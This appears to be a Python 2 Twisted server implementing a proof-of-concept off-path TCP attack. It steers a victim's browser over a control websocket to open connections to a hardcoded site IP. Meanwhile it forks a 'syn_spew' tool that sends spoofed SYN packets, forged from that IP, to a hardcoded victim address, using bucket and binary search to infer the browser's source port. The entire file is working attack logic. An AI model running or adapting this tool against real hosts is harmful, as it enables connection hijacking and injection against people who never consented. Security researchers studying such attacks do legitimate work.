#!/usr/bin/python

# Modified from https://github.com/gtaylor/txWS-example-project/blob/master/src/protocols/websockets.py

from twisted.internet import reactor
from twisted.internet.protocol import Factory, Protocol
from twisted.python import log

import sys
import os
import signal
import subprocess
import time

class WebSocketServerFactory(Factory):
    """
    This is used by twisted.internet.TCPServer to create TCP Servers for each
    port the server listens on.
    """
    def __init__(self, service):
        """
        :attr WebSocketService service: Reference to the top-level service.
        :attr EchoUpper protocol: The protocol this factor spawns.
        """
        self.service = service
        self.protocol = ControlWebSocket
        print "setup websocketserverfactory"

    def buildProtocol(self, addr):
        #return super(WebSocketServerFactory, self).buildProtocol(addr)
        p = self.protocol(addr)
        p.factory = self
        return p


NUM_BUCKETS = 50
LOW_PORT = 32768
HIGH_PORT = 61000
TEST_VICTIM_IP = '192.168.1.107'
PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / NUM_BUCKETS

class ControlWebSocket(Protocol):
    """
    The control_sock in page.html - here we issue new commands to the browser,
    such as "make a new websocket to site.com", while we spoof SYN packets from site.com
    to guess the source port the client picked.
    """
    def __init__(self, addr):
        self.addr = addr
        self.calls = 0
        self.spewer_pid = None
        print 'control web from %s' % addr

    def spawnSpewer(self, low_port, high_port):
        if self.spewer_pid != None:
            print 'Error: spewer already (still?) running!'
            reactor.stop()

        try:
            self.spewer_pid = os.fork()
            if self.spewer_pid > 0:
                # parent
                return
        except OSError, e:
            print 'Error: %s' % e.strerror
        #self.addr.host = TEST_VICTIM_IP
        #subprocess.call(['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
        #                 '-r', '100', '-d', '100', self.addr.host, '69.171.242.11:80'])
        os.execvp('./syn_spew', ['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
                                '-r', '0', '-d', '100', TEST_VICTIM_IP, '69.171.242.11:80'])
        #sys.exit(0)


    def getBucketPortRange(self):
        high = LOW_PORT + (self.bucket + 1) * PORT_BUCKET_SIZE - 1
        if self.bucket == (NUM_BUCKETS - 1):
            high = HIGH_PORT
        low = LOW_PORT + self.bucket * PORT_BUCKET_SIZE
        return (low, high)


    def adjustBucket(self, success):
        """
        Given the current bucket (self.min_port - self.mid_port), was the browser's source port in there?
        If it was, we'll look in the lower half of that range next, 
        otherwise, it was in self.mid_port - self.max_port
        """

        self.calls += 1
        if (self.calls > 25):
            print 'yikes, 25 calls...quitting'
            reactor.stop()
            return

        if self.min_port == self.mid_port:
            if success:
                port = self.min_port
            else:
                port = self.max_port
            print 'Success!!! we did it! port: %d' % port
            self.transport.write("show <b>Used port %d</b>" % port) 
            reactor.stop()
            return

        if success:
            # Look left
            self.min_port = self.min_port
            self.max_port = self.mid_port
            self.mid_port = (self.min_port + self.mid_port) / 2
        else:
            self.min_port = self.mid_port
            self.mid_port = (self.mid_port + self.max_port) / 2
            self.max_port = self.max_port
        

        # since the browser's source port will increment by one each guess,
        # we'll increment here too.
        self.min_port += 1
        if self.mid_port < HIGH_PORT:
            self.mid_port += 1
        if self.max_port < HIGH_PORT:
            self.max_port += 1

    def cleanupOldWebsocket(self):
        subprocess.call(['./syn_spew', '-R', '-p', '%d-%d' % (self.min_port, self.mid_port), \
                         '-r', '3', '-d', '100', TEST_VICTIM_IP, '69.171.242.11:80'])
        print 'done'

        if self.bucket_search:
            # now we will use binary search
            self.bucket_search = False
    
            (self.min_port, self.max_port) = self.getBucketPortRange() 
            self.mid_port = (self.min_port + self.max_port) / 2
        else:
            self.adjustBucket(True)
        
        print 'calling fireagain from cleanupOldWebsocket in 0.2....'
        reactor.callLater(0.2, self.fireAgain)
 

    def websocketTimeout(self):
        """
        Haven't heard back from websocket in a while, maybe this bucket won?!
        """

        self.websocketTimeoutCb = None  # ha, we win
        print 'websocket timeout, killing... (%d-%d)' % (self.min_port, self.mid_port)

        if self.spewer_pid != None:
            os.kill(self.spewer_pid, signal.SIGKILL)
            self.spewer_pid = None

        self.transport.write("kill") # kill the current websocket, so that it will try to make a new one in a bit

        reactor.callLater(0.2, self.cleanupOldWebsocket)
       

    def fireAgain(self):
        """
        start constructing and spewing syn packets to victim
        """

        if self.bucket_search:
            (self.min_port, self.mid_port) = self.getBucketPortRange()
        
        print 'firing %d-%d' % (self.min_port, self.mid_port)

        self.spawnSpewer(self.min_port, self.mid_port)

        self.transport.write("show <b>testing %d - %d...</b>" % ( self.min_port, self.mid_port))
        self.transport.write("make ws://69.171.242.11/") 

        self.fire_time = time.time()
        self.websocketTimeoutCb = reactor.callLater(2, self.websocketTimeout)
        

    def dataReceived(self, data):
        #log.msg("Got %r" % (data,))
        if data == 'closed':
            if self.spewer_pid != None:
                os.kill(self.spewer_pid, signal.SIGKILL)
                self.spewer_pid = None

            if self.bucket_search == True:
                # still doing a linear search over buckets
                self.bucket += 1
                if (self.bucket == NUM_BUCKETS):
                    print 'Ah, well that is the game :('
                    reactor.stop()
                    return

            if (self.fire_time != None):
                print 'diff: %f' % (time.time() - self.fire_time)
            
            if self.websocketTimeoutCb != None:
                # We have a timeout callback outstanding we need to cancel
                self.websocketTimeoutCb.cancel()

            if not(self.bucket_search):
                self.adjustBucket(False) # The browser's source port was NOT in this bucket

            print 'close calling fireAgain in 0.2...'
            reactor.callLater(0.2, self.fireAgain)

    def connectionMade(self):
        self.bucket_search = True
        self.bucket = 0
        self.fireAgain()
